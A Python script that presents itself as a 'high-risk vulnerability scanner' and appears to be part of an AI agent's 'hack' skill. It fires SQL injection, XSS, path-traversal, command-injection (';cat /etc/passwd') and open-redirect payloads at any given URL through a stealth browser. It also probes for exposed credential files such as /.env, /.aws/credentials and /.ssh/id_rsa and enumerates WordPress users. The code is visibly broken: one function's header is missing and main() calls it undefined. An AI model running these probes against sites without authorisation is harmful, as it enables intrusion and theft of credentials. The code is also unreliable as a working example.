#!/usr/bin/env python3
"""High-risk vulnerability scanner via CDP/Playwright.

Usage:
  python vuln_scan.py https://target.com
  python vuln_scan.py https://target.com --cdp-port 9222 --output report.json
"""
import sys, json, re, time, urllib.parse, argparse
from datetime import datetime
from urllib.parse import urlsplit

sys.stdout.reconfigure(encoding='utf-8', errors='replace')
sys.stderr.reconfigure(encoding='utf-8', errors='replace')

sys.path.insert(0, r"C:\Users\97912\.codex\skills\hack\scripts")
from cdp_launch import connect_playwright_cdp

# ASCII-safe severity icons
ICONS = {"CRITICAL": "[!]", "HIGH": "[!]", "MEDIUM": "[*]", "LOW": "[-]", "INFO": "[i]"}

# ── CLI ───────────────────────────────────────────────────────────────────────

def parse_args():
    parser = argparse.ArgumentParser(description="High-Risk Vulnerability Scanner")
    parser.add_argument("target", help="Target URL (e.g. https://example.com)")
    parser.add_argument("--cdp-port", type=int, default=9222, help="CDP port (default: 9222)")
    parser.add_argument("--output", default="vuln_report.json", help="Output JSON report path")
    return parser.parse_args()

ARGS = parse_args()
TARGET = ARGS.target if ARGS.target.startswith("http") else f"https://{ARGS.target}"
_parsed = urlsplit(TARGET)
BASE = f"{_parsed.scheme}://{_parsed.netloc}"
PORT = ARGS.cdp_port
REPORT_PATH = ARGS.output

# ============ HIGH-RISK PAYLOADS ============
SQLI_PAYLOADS = [
    "' OR '1'='1", "' OR '1'='1'--", "' OR '1'='1'/*", "1' AND '1'='1", "1' AND '1'='2",
    "1 UNION SELECT NULL--", "1 UNION SELECT NULL,NULL--", "'; WAITFOR DELAY '0:0:3'--",
    "1; WAITFOR DELAY '0:0:3'--", "' AND SLEEP(3)--", "1 AND SLEEP(3)",
    "admin'--", "admin' OR '1'='1'--", "' OR 1=1#", "\" OR \"\"=\"", "1 OR 1=1",
]
XSS_PAYLOADS = [
    "<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "\"><script>alert(1)</script>",
    "javascript:alert(1)", "<svg onload=alert(1)>", "'-alert(1)-'", "<body onload=alert(1)>",
    "<iframe src=javascript:alert(1)>", "<details open ontoggle=alert(1)>",
]
PATH_TRAVERSAL = [
    "../../../../etc/passwd", "..\\..\\..\\..\\windows\\win.ini", "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "..%252f..%252f..%252fetc%252fpasswd",
    "/etc/passwd", "C:\\windows\\win.ini",
]
OPEN_REDIRECT = ["https://evil.com", "//evil.com", "\\\\evil.com", "/redirect?url=https://evil.com"]
CMD_INJECTION = [";id", "|id", "`id`", "$(id)", ";cat /etc/passwd", "|cat /etc/passwd",
                 "&whoami", "&&whoami", ";ping -c3 127.0.0.1", "|ping -n 3 127.0.0.1"]

# Common sensitive paths
SENSITIVE_PATHS = [
    "/.env", "/.git/config", "/.git/HEAD", "/.svn/entries", "/.DS_Store",
    "/wp-config.php", "/wp-config.php.bak", "/configuration.php", "/config.php", "/config.json",
    "/.htaccess", "/.htpasswd", "/backup/", "/backup.zip", "/backup.sql", "/dump.sql",
    "/db.sql", "/database.sql", "/phpinfo.php", "/info.php", "/test.php",
    "/admin/", "/admin/login.php", "/administrator/", "/adminpanel/", "/wp-admin/",
    "/manager/", "/panel/", "/dashboard/", "/cpanel/", "/phpmyadmin/", "/pma/", "/mysql/",
    "/api/", "/api/v1/", "/api/users", "/api/config", "/graphql",
    "/.well-known/security.txt", "/robots.txt", "/sitemap.xml", "/crossdomain.xml",
    "/server-status", "/server-info", "/.idea/", "/.vscode/",
    "/uploads/", "/upload/", "/files/", "/temp/", "/tmp/",
    "/wp-json/wp/v2/users", "/wp-json/", "/xmlrpc.php", "/wp-content/debug.log",
    "/vendor/", "/node_modules/", "/composer.json", "/package.json", "/Gemfile",
    "/Dockerfile", "/docker-compose.yml", "/.dockerenv",
    "/console", "/actuator", "/actuator/env", "/actuator/health",
    "/struts/webconsole.html", "/cgi-bin/",
    "/login.php", "/register.php", "/forgot.php",
    "/.aws/credentials", "/.ssh/id_rsa", "/id_rsa",
    "/flag", "/flag.txt", "/flag.php",
    "/shell.php", "/webshell.php", "/c99.php", "/c100.php",
    "/install.php", "/setup.php", "/upgrade.php",
    "/license.txt", "/readme.txt", "/readme.html", "/CHANGELOG.txt",
    "/web.config", "/crossdomain.xml", "/clientaccesspolicy.xml",
    "/nginx.conf", "/httpd.conf", "/apache2.conf",
    "/.gitignore", "/.dockerignore", "/.npmignore",
    "/swagger-ui/", "/swagger.json", "/api-docs", "/v2/api-docs",
]

# WordPress specific
WP_PATHS = [
    "/wp-login.php", "/wp-admin/admin-ajax.php", "/wp-json/wp/v2/users",
    "/wp-json/wp/v2/posts", "/wp-json/wc/v3/products", "/xmlrpc.php",
    "/wp-content/uploads/", "/wp-content/plugins/", "/wp-content/themes/",
    "/wp-cron.php", "/wp-mail.php", "/wp-trackback.php", "/wp-blog-header.php",
    "/readme.html", "/license.txt", "/wp-content/debug.log",
    "/wp-content/backup-db/", "/wp-content/updraft/", "/wp-content/uploads/wpallimport/",
    "/wp-content/plugins/akismet/", "/wp-content/plugins/contact-form-7/",
    "/wp-content/plugins/elementor/", "/wp-content/plugins/woocommerce/",
    "/?author=1", "/?author=2", "/?author=3",
]

SSRF_PARAMS = ["url", "redirect", "next", "data", "reference", "site", "html",
               "val", "validate", "domain", "callback", "return", "page", "feed",
               "host", "port", "to", "out", "view", "cmd", "path", "dest", "rurl"]

findings = []

def add_finding(severity, vuln_type, url, detail, evidence=""):
    f = {"severity": severity, "type": vuln_type, "url": url, "detail": detail, "evidence": evidence[:500]}
    findings.append(f)
    icon = ICONS[severity]
    print(f"  {icon} [{severity}] {vuln_type}: {detail}")

def safe_get(ctx, url, timeout=15000):
    """GET request via Playwright APIRequestContext (browser network stack)."""
    try:
        resp = ctx.request.get(url, timeout=timeout, max_redirects=5)
        return resp
    except Exception as e:
        return None

def get_headers(ctx, url):
    resp = safe_get(ctx, url)
    if resp:
        return resp.status, dict(resp.headers), resp.text()
    return None, {}, ""

def check_sql_injection(ctx, url, params=None):
    """Test SQL injection on URL parameters."""
    print("\n[*] Testing SQL Injection...")
    parsed = urllib.parse.urlparse(url)
    qs = urllib.parse.parse_qs(parsed.query)
    if not qs:
        # Try common params
        for param in ["id", "page", "cat", "pid", "uid", "q", "search", "sort", "order"]:
            test_url = f"{url}?{param}=1"
            test_sql(ctx, test_url, param)
    else:
        for param in qs:
            test_sql(ctx, url, param)

def test_sql(ctx, url, param):
    base_parsed = urllib.parse.urlparse(url)
    base_qs = urllib.parse.parse_qs(base_parsed.query)
    base_val = base_qs.get(param, ["1"])[0]
    base_url = url.split("?")[0]
    # Baseline
    baseline_url = f"{base_url}?{param}={base_val}"
    baseline_resp = safe_get(ctx, baseline_url)
    if not baseline_resp:
        return
    baseline_len = len(baseline_resp.text())
    baseline_status = baseline_resp.status

    for payload in SQLI_PAYLOADS:
        test_url = f"{base_url}?{param}={urllib.parse.quote(payload)}"
        resp = safe_get(ctx, test_url)
        if not resp:
            continue
        body = resp.text()
        # Time-based check
        t_start = time.time()
        resp2 = safe_get(ctx, test_url)
        elapsed = time.time() - t_start
        # Error-based
        sql_errors = ["SQL syntax", "mysql_fetch", "ORA-", "SQLState", "PG::",
                       "Microsoft SQL", "ODBC SQL", "SQLite3::", "Warning: mysql",
                       "Warning: pg_", "SQLITE_ERROR", "syntax error", "unclosed quotation",
                       "unterminated quoted string", "Microsoft OLE DB Provider for SQL Server",
                       "Unclosed quotation mark", "pg_query", "mysql_query"]
        for err in sql_errors:
            if err.lower() in body.lower():
                add_finding("CRITICAL", "SQL Injection (Error-based)", test_url,
                           f"SQL error detected with param '{param}'", body[:300])
                return
        # Boolean-based
        true_url = f"{base_url}?{param}={urllib.parse.quote(base_val + ' AND 1=1')}"
        false_url = f"{base_url}?{param}={urllib.parse.quote(base_val + ' AND 1=2')}"
        true_resp = safe_get(ctx, true_url)
        false_resp = safe_get(ctx, false_url)
        if true_resp and false_resp:
            true_len = len(true_resp.text())
            false_len = len(false_resp.text())
            if true_len > 0 and abs(true_len - baseline_len) < 50 and abs(false_len - true_len) > 200:
                add_finding("CRITICAL", "SQL Injection (Boolean-based)", test_url,
                           f"Boolean diff detected: true={true_len}, false={false_len}, baseline={baseline_len}")
                return
        # Time-based
        if elapsed > 2.5:
            add_finding("CRITICAL", "SQL Injection (Time-based)", test_url,
                       f"Response delayed {elapsed:.1f}s with SLEEP payload on param '{param}'")
            return

def check_xss(ctx, url):
    """Test reflected XSS on URL parameters."""
    print("\n[*] Testing XSS...")
    parsed = urllib.parse.urlparse(url)
    qs = urllib.parse.parse_qs(parsed.query)
    if not qs:
        for param in ["q", "search", "s", "query", "keyword", "name", "msg", "text", "title", "content"]:
            test_xss_param(ctx, url, param)
    else:
        for param in qs:
            test_xss_param(ctx, url, param)

def test_xss_param(ctx, url, param):
    base_url = url.split("?")[0]
    for payload in XSS_PAYLOADS:
        test_url = f"{base_url}?{param}={urllib.parse.quote(payload)}"
        resp = safe_get(ctx, test_url)
        if not resp:
            continue
        body = resp.text()
        if payload in body or urllib.parse.unquote(payload) in body:
            add_finding("HIGH", "Reflected XSS", test_url,
                       f"Payload reflected unescaped in param '{param}'", body[:300])
            return
        # Check if partially reflected (tags stripped but content visible)
        stripped = re.sub(r'<[^>]+>', '', payload)
        if stripped in body and payload not in body:
            # Check if any HTML is reflected
            if '<' in body and '>' in body:
                add_finding("MEDIUM", "Partial XSS Reflection", test_url,
                           f"Partial reflection in param '{param}' (may be filtered)")

def check_path_traversal(ctx, url):
    """Test path traversal / LFI."""
    print("\n[*] Testing Path Traversal / LFI...")
    base_url = url.split("?")[0]
    for param in ["file", "page", "path", "template", "include", "dir", "folder", "src", "dest", "document"]:
        for payload in PATH_TRAVERSAL:
            test_url = f"{base_url}?{param}={urllib.parse.quote(payload)}"
            resp = safe_get(ctx, test_url)
            if not resp:
                continue
            body = resp.text()
            if "root:x:0:0:" in body or "root::0:0:" in body:
                add_finding("CRITICAL", "Path Traversal / LFI", test_url,
                           f"Unix /etc/passwd readable via param '{param}'", body[:300])
                return
            if "[fonts]" in body or "[extensions]" in body or "[boot loader]" in body:
                add_finding("CRITICAL", "Path Traversal / LFI", test_url,
                           f"Windows win.ini readable via param '{param}'", body[:300])
                return

def check_cmd_injection(ctx, url):
    """Test command injection."""
    print("\n[*] Testing Command Injection...")
    base_url = url.split("?")[0]
    for param in ["cmd", "exec", "command", "ping", "host", "ip", "domain", "file", "name"]:
        for payload in [";echo INJ_TEST_1234", "|echo INJ_TEST_1234", "`echo INJ_TEST_1234`", "$(echo INJ_TEST_1234)"]:
            test_url = f"{base_url}?{param}={urllib.parse.quote(payload)}"
            resp = safe_get(ctx, test_url)
            if not resp:
                continue
            if "INJ_TEST_1234" in resp.text():
                add_finding("CRITICAL", "Command Injection", test_url,
                           f"Command output reflected via param '{param}'", resp.text()[:300])
                return

def check_open_redirect(ctx, url):
    """Test open redirect."""
    print("\n[*] Testing Open Redirect...")
    base_url = url.split("?")[0]
    for param in ["redirect", "url", "next", "return", "returnUrl", "return_url", "goto", "dest", "destination", "to", "from", "ref"]:
        for payload in ["https://evil.com", "//evil.com"]:
            test_url = f"{base_url}?{param}={urllib.parse.quote(payload)}"
            try:
                resp = ctx.request.get(test_url, timeout=10000, max_redirects=0)
                if resp:
                    location = resp.headers.get("location", "")
                    if "evil.com" in location:
                        add_finding("HIGH", "Open Redirect", test_url,
                                   f"Redirects to external URL via param '{param}'", location)
                        return
            except Exception as e:
                print(f"  [!] Open redirect test error: {e}")
    """Probe sensitive paths."""
    print("\n[*] Probing Sensitive Paths...")
    for path in SENSITIVE_PATHS:
        url = BASE + path
        resp = safe_get(ctx, url, timeout=10000)
        if not resp:
            continue
        status = resp.status
        body = resp.text()
        body_len = len(body)
        if status == 200 and body_len > 0:
            # Classify
            if path in ["/.env"]:
                if "DB_" in body or "APP_KEY" in body or "DATABASE" in body or "PASSWORD" in body:
                    add_finding("CRITICAL", "Sensitive File Exposure", url, ".env file exposed with credentials", body[:400])
                else:
                    add_finding("HIGH", "Sensitive File Exposure", url, ".env file accessible", body[:200])
            elif "/.git/" in path:
                add_finding("HIGH", "Source Code Exposure", url, "Git repository metadata accessible", body[:200])
            elif path in ["/wp-config.php", "/config.php", "/configuration.php"]:
                if "DB_" in body or "password" in body.lower() or "define(" in body:
                    add_finding("CRITICAL", "Config File Exposure", url, "Config file with credentials accessible", body[:400])
            elif path in ["/phpinfo.php", "/info.php"]:
                if "phpinfo" in body.lower() or "PHP Version" in body:
                    add_finding("HIGH", "Information Disclosure", url, "phpinfo() page exposed", body[:200])
            elif path in ["/backup.sql", "/dump.sql", "/db.sql", "/database.sql"]:
                if "CREATE TABLE" in body or "INSERT INTO" in body:
                    add_finding("CRITICAL", "Database Dump Exposure", url, "SQL dump file accessible", body[:300])
            elif path in ["/backup.zip", "/backup/"]:
                add_finding("HIGH", "Backup File Exposure", url, "Backup file/directory accessible")
            elif path in ["/.htaccess", "/.htpasswd"]:
                add_finding("MEDIUM", "Sensitive File Exposure", url, "Apache config file accessible")
            elif path in ["/phpmyadmin/", "/pma/", "/mysql/"]:
                add_finding("HIGH", "Admin Panel Exposure", url, "Database admin panel exposed")
            elif path in ["/admin/", "/administrator/", "/wp-admin/", "/adminpanel/"]:
                add_finding("MEDIUM", "Admin Panel Exposure", url, f"Admin panel found (status {status})")
            elif path in ["/wp-json/wp/v2/users"]:
                if "id" in body and "name" in body and "slug" in body:
                    add_finding("MEDIUM", "User Enumeration", url, "WordPress user enumeration via REST API", body[:300])
            elif path == "/xmlrpc.php":
                if "XML-RPC" in body or "xmlrpc" in body.lower():
                    add_finding("MEDIUM", "XML-RPC Enabled", url, "WordPress XML-RPC interface accessible")
            elif path == "/robots.txt":
                if body.strip():
                    add_finding("INFO", "robots.txt", url, "robots.txt found", body[:300])
            elif path == "/readme.html":
                if "WordPress" in body:
                    ver_match = re.search(r'Version\s+([\d.]+)', body)
                    ver = ver_match.group(1) if ver_match else "unknown"
                    add_finding("MEDIUM", "Version Disclosure", url, f"WordPress {ver} version exposed")
            elif path in ["/.aws/credentials", "/.ssh/id_rsa"]:
                add_finding("CRITICAL", "Credential File Exposure", url, "Cloud/SSH credentials accessible", body[:300])
            elif path in ["/swagger-ui/", "/swagger.json", "/api-docs", "/v2/api-docs"]:
                add_finding("MEDIUM", "API Documentation Exposure", url, "API docs/swagger accessible")
            elif path in ["/actuator", "/actuator/env", "/actuator/health"]:
                add_finding("HIGH", "Spring Boot Actuator Exposure", url, "Actuator endpoint accessible", body[:300])
            elif path in ["/server-status", "/server-info"]:
                add_finding("MEDIUM", "Server Status Exposure", url, "Apache server-status accessible")
            elif path in ["/composer.json", "/package.json"]:
                add_finding("LOW", "Dependency File Exposure", url, "Dependency file accessible", body[:200])
            elif path in ["/.idea/", "/.vscode/"]:
                add_finding("LOW", "IDE Config Exposure", url, "IDE configuration directory accessible")
            elif path == "/web.config":
                add_finding("MEDIUM", "Config Exposure", url, "IIS web.config accessible", body[:200])
            elif "flag" in path.lower():
                add_finding("CRITICAL", "Flag File", url, "Flag file found!", body[:300])
            else:
                if body_len > 10 and status == 200:
                    add_finding("INFO", "Accessible Path", url, f"HTTP {status}, {body_len} bytes")
        elif status == 401 or status == 403:
            if path in ["/admin/", "/administrator/", "/wp-admin/", "/phpmyadmin/", "/pma/", "/manager/", "/panel/"]:
                add_finding("INFO", "Protected Admin Path", url, f"Admin path exists but protected (HTTP {status})")

def check_wp_specific(ctx):
    """WordPress-specific checks."""
    print("\n[*] WordPress Specific Checks...")
    # Check if WP
    resp = safe_get(ctx, BASE + "/wp-login.php")
    if resp and resp.status == 200 and ("wp-login" in resp.text().lower() or "wordpress" in resp.text().lower()):
        add_finding("INFO", "WordPress Detected", BASE + "/wp-login.php", "WordPress login page found")
        # User enumeration via author param
        for i in range(1, 6):
            resp = safe_get(ctx, f"{BASE}/?author={i}", timeout=10000)
            if resp and resp.status in [200, 301, 302]:
                location = resp.headers.get("location", "")
                if "author=" in location or "author-" in location:
                    name_match = re.search(r'author/([^/]+)/?', location)
                    if name_match:
                        add_finding("MEDIUM", "WordPress User Enumeration", f"{BASE}/?author={i}",
                                   f"User #{i}: {name_match.group(1)}")
        # XML-RPC
        resp = safe_get(ctx, BASE + "/xmlrpc.php")
        if resp and resp.status == 200:
            if "XML-RPC" in resp.text() or "xmlrpc" in resp.text().lower():
                # Try system.listMethods
                xml_body = '''<?xml version="1.0"?>
<methodCall><methodName>system.listMethods</methodName><params></params></methodCall>'''
                try:
                    resp2 = ctx.request.post(BASE + "/xmlrpc.php", data=xml_body,
                                            headers={"Content-Type": "text/xml"}, timeout=15000)
                    if resp2 and resp2.status == 200 and "listMethods" in resp2.text():
                        methods = resp2.text()
                        dangerous = ["wp.uploadFile", "system.multicall", "wp.getUsers"]
                        for m in dangerous:
                            if m in methods:
                                add_finding("HIGH", "XML-RPC Dangerous Method", BASE + "/xmlrpc.php",
                                           f"Method '{m}' available via XML-RPC")
                except Exception as e:
                    print(f"  [!] XML-RPC method check error: {e}")
        # WP REST API user enumeration
        resp = safe_get(ctx, BASE + "/wp-json/wp/v2/users")
        if resp and resp.status == 200:
            try:
                users = json.loads(resp.text())
                if isinstance(users, list) and len(users) > 0:
                    names = [u.get("name", "?") for u in users]
                    add_finding("MEDIUM", "WordPress User Enumeration (REST API)", BASE + "/wp-json/wp/v2/users",
                               f"Found {len(users)} users: {', '.join(names)}")
            except Exception as e:
                print(f"  [!] WP REST API user enum error: {e}")
        # WP-Cron
        resp = safe_get(ctx, BASE + "/wp-cron.php")
        if resp and resp.status == 200:
            add_finding("LOW", "WP-Cron Accessible", BASE + "/wp-cron.php", "wp-cron.php is accessible (can be used for DoS)")

def check_security_headers(ctx, url):
    """Check security headers."""
    print("\n[*] Checking Security Headers...")
    status, headers, body = get_headers(ctx, url)
    if not status:
        return
    missing = []
    important_headers = {
        "X-Frame-Options": "Clickjacking protection",
        "X-Content-Type-Options": "MIME sniffing protection",
        "Strict-Transport-Security": "HSTS (HTTPS enforcement)",
        "Content-Security-Policy": "XSS/content injection protection",
        "X-XSS-Protection": "Legacy XSS protection",
    }
    for h, desc in important_headers.items():
        found = False
        for k in headers:
            if k.lower() == h.lower():
                found = True
                break
        if not found:
            missing.append(f"{h} ({desc})")
    if missing:
        add_finding("MEDIUM", "Missing Security Headers", url, f"Missing: {', '.join(missing)}")
    # Server version disclosure
    server = headers.get("server", headers.get("Server", ""))
    if server:
        add_finding("INFO", "Server Version Disclosure", url, f"Server: {server}")
    powered_by = headers.get("x-powered-by", headers.get("X-Powered-By", ""))
    if powered_by:
        add_finding("INFO", "Technology Disclosure", url, f"X-Powered-By: {powered_by}")

def check_forms(ctx, url):
    """Analyze forms on the page for potential issues using existing context."""
    print("\n[*] Analyzing Page Forms...")
    page = ctx.new_page()
    try:
        page.goto(url, timeout=20000, wait_until="domcontentloaded")
        forms = page.query_selector_all("form")
        for i, form in enumerate(forms):
            action = form.get_attribute("action") or ""
            method = (form.get_attribute("method") or "GET").upper()
            inputs = form.query_selector_all("input, textarea, select")
            field_names = []
            has_csrf = False
            has_password = False
            for inp in inputs:
                name = inp.get_attribute("name") or ""
                ftype = inp.get_attribute("type") or "text"
                field_names.append(f"{name}({ftype})")
                if "csrf" in name.lower() or "token" in name.lower():
                    has_csrf = True
                if ftype == "password":
                    has_password = True
            if has_password and method == "GET":
                add_finding("MEDIUM", "Insecure Form", url,
                           f"Form #{i+1}: password field sent via GET (credentials in URL)")
            if has_password and not has_csrf:
                add_finding("LOW", "Missing CSRF Token", url,
                           f"Form #{i+1}: login/password form without CSRF token")
            if action and "http://" in action and "https://" not in action:
                add_finding("MEDIUM", "Insecure Form Action", url,
                           f"Form #{i+1}: submits to HTTP (not HTTPS): {action}")
            print(f"  [Form #{i+1}] {method} {action} -- fields: {', '.join(field_names)}")
        # Check for JavaScript framework info
        tech = page.evaluate("""() => {
            let t = {};
            t.jquery = typeof jQuery !== 'undefined';
            t.react = typeof __REACT_DEVTOOLS_GLOBAL_HOOK__ !== 'undefined';
            t.vue = typeof __VUE_DEVTOOLS_GLOBAL_HOOK__ !== 'undefined';
            t.angular = typeof ng !== 'undefined' && typeof ng.probe !== 'undefined';
            t.wordpress = document.querySelector('meta[name="generator"]')?.content || '';
            return t;
        }""")
        if tech.get("wordpress"):
            add_finding("INFO", "CMS Detection", url, f"Generator: {tech['wordpress']}")
        if tech.get("jquery"):
            add_finding("INFO", "Technology", url, "jQuery detected")
        if tech.get("react"):
            add_finding("INFO", "Technology", url, "React detected")
        if tech.get("vue"):
            add_finding("INFO", "Technology", url, "Vue detected")
    except Exception as e:
        print(f"  [!] Form analysis error: {e}")
    finally:
        try:
            page.close()
        except Exception as e:
            print(f"  [!] Page close error: {e}")

def check_ssl_tls(ctx, url):
    """Check SSL/TLS configuration."""
    print("\n[*] Checking SSL/TLS...")
    status, headers, body = get_headers(ctx, url)
    if status:
        hsts = headers.get("strict-transport-security", headers.get("Strict-Transport-Security", ""))
        if not hsts:
            add_finding("LOW", "Missing HSTS", url, "Strict-Transport-Security header not set")
        else:
            add_finding("INFO", "HSTS Enabled", url, f"HSTS: {hsts}")

def main():
    print(f"{'='*60}")
    print(f"  High-Risk Vulnerability Scanner — {TARGET}")
    print(f"  Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"{'='*60}")

    browser, pw = connect_playwright_cdp(port=PORT, stealth=True)
    ctx = browser.contexts[0]

    # 1. Recon — headers & server info
    print("\n[*] Initial Reconnaissance...")
    status, headers, body = get_headers(ctx, TARGET)
    if status:
        print(f"  Status: {status}")
        print(f"  Server: {headers.get('server', headers.get('Server', 'N/A'))}")
        print(f"  X-Powered-By: {headers.get('x-powered-by', headers.get('X-Powered-By', 'N/A'))}")
        print(f"  Content-Type: {headers.get('content-type', headers.get('Content-Type', 'N/A'))}")
        title_match = re.search(r'<title>(.*?)</title>', body, re.I | re.S)
        if title_match:
            print(f"  Title: {title_match.group(1).strip()}")

    # 2. Security headers
    check_security_headers(ctx, TARGET)

    # 3. SSL/TLS
    check_ssl_tls(ctx, TARGET)

    # 4. Sensitive path probing
    check_sensitive_paths(ctx)

    # 5. WordPress specific
    check_wp_specific(ctx)

    # 6. SQL Injection
    check_sql_injection(ctx, TARGET)

    # 7. XSS
    check_xss(ctx, TARGET)

    # 8. Path Traversal / LFI
    check_path_traversal(ctx, TARGET)

    # 9. Command Injection
    check_cmd_injection(ctx, TARGET)

    # 10. Open Redirect
    check_open_redirect(ctx, TARGET)

    # 11. Form analysis (needs page rendering)
    check_forms(ctx, TARGET)

    # ============ REPORT ============
    print(f"\n{'='*60}")
    print(f"  SCAN COMPLETE — FINDINGS SUMMARY")
    print(f"{'='*60}")
    counts = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0, "INFO": 0}
    for f in findings:
        counts[f["severity"]] += 1
    print(f"  [!] CRITICAL: {counts['CRITICAL']}")
    print(f"  [!] HIGH:     {counts['HIGH']}")
    print(f"  [*] MEDIUM:   {counts['MEDIUM']}")
    print(f"  [-] LOW:      {counts['LOW']}")
    print(f"  [i] INFO:     {counts['INFO']}")
    print(f"  TOTAL:       {len(findings)}")
    print(f"{'='*60}")

    # Detail output
    if findings:
        print("\n[DETAILED FINDINGS]")
        for i, f in enumerate(findings, 1):
            icon = ICONS[f["severity"]]
            print(f"\n--- Finding #{i} {icon} [{f['severity']}] {f['type']} ---")
            print(f"  URL:     {f['url']}")
            print(f"  Detail:  {f['detail']}")
            if f['evidence']:
                print(f"  Evidence: {f['evidence'][:200]}")

    # Save JSON report
    report = {
        "target": TARGET,
        "scan_time": datetime.now().isoformat(),
        "total_findings": len(findings),
        "summary": counts,
        "findings": findings,
    }
    with open(REPORT_PATH, "w", encoding="utf-8") as fout:
        json.dump(report, fout, ensure_ascii=False, indent=2)
    print(f"\n[+] JSON report saved to: {REPORT_PATH}")

if __name__ == "__main__":
    main()
